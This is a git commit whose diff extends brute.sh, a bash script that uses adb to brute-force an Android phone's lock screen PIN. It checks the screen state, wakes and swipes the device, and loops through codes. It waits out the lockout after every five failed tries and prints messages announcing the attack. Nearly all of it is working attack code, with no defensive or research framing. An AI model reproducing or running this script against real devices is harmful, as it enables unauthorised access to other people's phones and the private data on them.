809d7f1856a20fe6ad41c2f953b9f12b4ccd4651
JebemtiMaiku <niki.iff@hotmail.com>
2023-05-23 23:44:47 +0200

    sadf

--- brute.sh
+++ brute.sh
@@ -1,6 +1,14 @@
 #!/bin/bash
 
+screen="$(adb shell dumpsys activity|grep -i mCurrentFocus|awk 'NR==1{print $3}'|cut -d'}' -f1)"
+case $screen in
+    "mScreenState=OFF") echo -e "Preparing to attack."; 
+        echo -e "All Has Been Set" ;;
+    "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
+esac
+echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
 adb shell input keyevent 3
+echo "home button"
 adb shell input keyevent 82
 adb shell input swipe 407 1211 378 85
 while true
@@ -14,6 +22,7 @@ do
             done
             adb shell input keyevent 66
             adb shell input keyevent 3
+            echo "home button"
             if ! (( `expr $i + 1` % 5 )); then
                 echo "now timeout"
                 adb shell input keyevent 66
